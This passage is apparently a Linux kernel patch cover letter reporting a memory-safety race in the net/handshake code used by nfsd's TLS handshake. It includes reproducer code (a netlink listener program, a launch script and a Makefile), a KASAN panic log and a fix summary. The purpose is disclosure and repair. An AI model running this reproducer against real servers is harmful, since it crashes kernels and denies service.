+		count = parse_u32(argv[1], "count");
+
+	signal(SIGINT, on_signal);
+	signal(SIGTERM, on_signal);
+
+	socks = calloc(count, sizeof(*socks));
+	if (!socks) {
+		perror("calloc");
+		return 1;
+	}
+
+	socks[0] = nl_socket_alloc();
+	if (!socks[0]) {
+		fprintf(stderr, "nl_socket_alloc failed\n");
+		return 1;
+	}
+	if (genl_connect(socks[0]) < 0) {
+		fprintf(stderr, "genl_connect failed\n");
+		return 1;
+	}
+
+	grp = genl_ctrl_resolve_grp(socks[0], "handshake", "tlshd");
+	if (grp < 0) {
+		fprintf(stderr, "genl_ctrl_resolve_grp failed: %s\n", nl_geterror(grp));
+		return 1;
+	}
+	nl_socket_free(socks[0]);
+	socks[0] = NULL;
+
+	for (unsigned int i = 0; i < count; i++) {
+		socks[i] = nl_socket_alloc();
+		if (!socks[i]) {
+			fprintf(stderr, "nl_socket_alloc failed at %u\n", i);
+			count = i;
+			break;
+		}
+		nl_socket_set_buffer_size(socks[i], 1024, 0);
+		if (genl_connect(socks[i]) < 0) {
+			fprintf(stderr, "genl_connect failed at %u\n", i);
+			nl_socket_free(socks[i]);
+			socks[i] = NULL;
+			count = i;
+			break;
+		}
+		if (nl_socket_add_membership(socks[i], grp) < 0) {
+			fprintf(stderr, "membership failed at %u\n", i);
+			nl_socket_free(socks[i]);
+			socks[i] = NULL;
+			count = i;
+			break;
+		}
+	}
+
+	fprintf(stderr, "opened %u listeners on group %d\n", count, grp);
+	while (!stop_now)
+		sleep(1);
+
+	for (unsigned int i = 0; i < count; i++)
+		if (socks[i])
+			nl_socket_free(socks[i]);
+	free(socks);
+	return 0;
+}
+------END listener.c--------
+
+------BEGIN poc.sh------
+#!/bin/sh
+set -eu
+
+DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
+THREADS=${THREADS:-32}
+ATTEMPTS=${ATTEMPTS:-0}
+LISTENERS=${LISTENERS:-1024}
+DELAYS=${DELAYS:-"1800 2000 2200 2500"}
+
+mount -t nfsd nfsd /proc/fs/nfsd 2>/dev/null || true
+if ! pgrep -x rpcbind >/dev/null 2>&1; then
+	rpcbind -w
+	sleep 1
+fi
+
+echo tcp 2049 > /proc/fs/nfsd/portlist 2>/dev/null || true
+echo 8 > /proc/fs/nfsd/threads
+
+make -C "$DIR" poc >/dev/null
+gcc -O2 -pthread -Wall -Wextra \
+	$(pkg-config --cflags libnl-3.0 libnl-genl-3.0) \
+	-o "$DIR/listener" "$DIR/listener.c" \
+	$(pkg-config --libs libnl-3.0 libnl-genl-3.0)
+
+"$DIR/listener" "$LISTENERS" &
+listener_pid=$!
+trap 'kill $listener_pid 2>/dev/null || true; wait $listener_pid 2>/dev/null || true' EXIT INT TERM
+sleep 2
+
+pids=""
+for delay in $DELAYS; do
+	"$DIR/poc" -t "$THREADS" -d "$delay" -n "$ATTEMPTS" &
+	pids="$pids $!"
+done
+
+for pid in $pids; do
+	wait "$pid"
+done
+------END poc.sh--------
+
+------BEGIN Makefile------
+CC ?= gcc
+CFLAGS ?= -O2 -pthread -Wall -Wextra
+NL_CFLAGS := $(shell pkg-config --cflags libnl-3.0 libnl-genl-3.0 2>/dev/null)
+NL_LIBS := $(shell pkg-config --libs libnl-3.0 libnl-genl-3.0 2>/dev/null)
+
+all: poc
+
+poc: poc.c
+	$(CC) $(CFLAGS) -o $@ $<
+
+listener: listener.c
+	$(CC) $(CFLAGS) $(NL_CFLAGS) -o $@ $< $(NL_LIBS)
+
+clean:
+	rm -f poc listener
+------END Makefile--------
+
+----BEGIN crash log----
+[  412.463830][ T9855] page_owner tracks the page as allocated
+
+[  412.464323][ T9855] page last allocated via order 1, migratetype Unmovable, gfp_mask 0xd20c0(__GFP_IO|__GFP_FS|__GFP_NOWARN|__GFP_NORETRY|__GFP_COMP|__GFP_NOMEMALLOC), pid 9854, tgid 9854 (nfsd), ts 373315545222, free_ts 371596521038
+
+[  412.465765][ T9855] page last free pid 15 tgid 15 stack trace:
+
+[  412.466314][ T9855] Kernel panic - not syncing: KASAN: panic_on_warn set ...
+
+[  412.466795][ T9855] CPU: 1 UID: 0 PID: 9855 Comm: nfsd Not tainted 7.1.0-rc1 #2 PREEMPT(full) 
+
+[  412.467375][ T9855] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+
+[  412.468078][ T9855] Call Trace:
+
+[  412.468307][ T9855]  <TASK>
+
+[  412.468506][ T9855]  vpanic+0x6c3/0x790
+
+[  412.468772][ T9855]  ? __pfx_vpanic+0x10/0x10
+
+[  412.469077][ T9855]  ? srso_alias_return_thunk+0x5/0xfbef5
+
+[  412.469470][ T9855]  ? memcmp+0x176/0x1d0
+
+[  412.469745][ T9855]  panic+0xca/0xd0
+
+[  412.469994][ T9855]  ? __pfx_panic+0x10/0x10
+
+[  412.470293][ T9855]  ? srso_alias_return_thunk+0x5/0xfbef5
+
+[  412.470665][ T9855]  ? preempt_schedule_common+0x42/0xc0
+
+[  412.471028][ T9855]  ? srso_alias_return_thunk+0x5/0xfbef5
+
+[  412.471409][ T9855]  ? preempt_schedule_thunk+0x16/0x30
+
+[  412.471776][ T9855]  check_panic_on_warn+0x61/0x80
+
+[  412.472107][ T9855]  end_report+0x13e/0x180
+
+[  412.472402][ T9855]  kasan_report+0xf4/0x120
+
+[  412.472702][ T9855]  ? memcmp+0x176/0x1d0
+
+[  412.472986][ T9855]  memcmp+0x176/0x1d0
+
+[  412.473253][ T9855]  handshake_req_hash_lookup+0x264/0x700
+
+[  412.473640][ T9855]  ? __pfx_handshake_req_hash_lookup+0x10/0x10
+
+[  412.474042][ T9855]  ? srso_alias_return_thunk+0x5/0xfbef5
+
+[  412.474422][ T9855]  ? srso_alias_return_thunk+0x5/0xfbef5
+
+[  412.474799][ T9855]  ? find_held_lock+0x2b/0x80
+
+[  412.475116][ T9855]  tls_handshake_close+0x32/0x70
+
+[  412.475455][ T9855]  svc_tcp_sock_detach+0x48/0x4f0
+
+[  412.475790][ T9855]  ? srso_alias_return_thunk+0x5/0xfbef5
+
+[  412.476162][ T9855]  svc_delete_xprt+0x12b/0xa00
+
+[  412.476483][ T9855]  ? srso_alias_return_thunk+0x5/0xfbef5
+
+[  412.476856][ T9855]  ? svc_pool_wake_idle_thread+0x20a/0x830
+
+[  412.477249][ T9855]  svc_recv+0x16df/0x2630
+
+[  412.477552][ T9855]  ? __pfx_svc_recv+0x10/0x10
+
+[  412.477869][ T9855]  ? nfsd+0x389/0xa80
+
+[  412.478144][ T9855]  nfsd+0x2db/0xa80
+
+[  412.478406][ T9855]  ? __entry_text_end+0x1020b5/0x1020b9
+
+[  412.478770][ T9855]  ? srso_alias_return_thunk+0x5/0xfbef5
+
+[  412.479148][ T9855]  ? _raw_spin_unlock_irqrestore+0x57/0x80
+
+[  412.479544][ T9855]  ? __pfx_nfsd+0x10/0x10
+
+[  412.479830][ T9855]  ? srso_alias_return_thunk+0x5/0xfbef5
+
+[  412.480206][ T9855]  ? srso_alias_return_thunk+0x5/0xfbef5
+
+[  412.480590][ T9855]  ? __kthread_parkme+0xb4/0x200
+
+[  412.480928][ T9855]  ? __pfx_nfsd+0x10/0x10
+
+[  412.481220][ T9855]  kthread+0x312/0x410
+
+[  412.481518][ T9855]  ? _raw_spin_unlock_irq+0x28/0x50
+
+[  412.481863][ T9855]  ? __pfx_kthread+0x10/0x10
+
+[  412.482171][ T9855]  ret_from_fork+0x600/0xa20
+
+[  412.482493][ T9855]  ? __pfx_ret_from_fork+0x10/0x10
+
+[  412.482835][ T9855]  ? srso_alias_return_thunk+0x5/0xfbef5
+
+[  412.483212][ T9855]  ? __switch_to+0x57f/0xe20
+
+[  412.483527][ T9855]  ? __pfx_kthread+0x10/0x10
+
+[  412.483841][ T9855]  ret_from_fork_asm+0x1a/0x30
+
+[  412.484181][ T9855]  </TASK>
+
+[  412.485060][ T9855] Kernel Offset: disabled
+
+[  412.485370][ T9855] Rebooting in 86400 seconds..
+
+-----END crash log-----
+
+Best regards,
+Luxiao Xu
+
+Luxiao Xu (1):
+  net/handshake: Protect request hash lookups
+
+ net/handshake/handshake-test.c |  3 +++
+ net/handshake/handshake.h      |  5 ++++
+ net/handshake/netlink.c        |  3 +++
+ net/handshake/request.c        | 43 +++++++++++++++++++++++++++++-----
+ net/handshake/tlshd.c          |  8 +++----
+ 5 files changed, 52 insertions(+), 10 deletions(-)
 
 -- 
-Chuck Lever (Come to NFS bake-a-thon! https://nfsv4bat.org)
+2.43.0
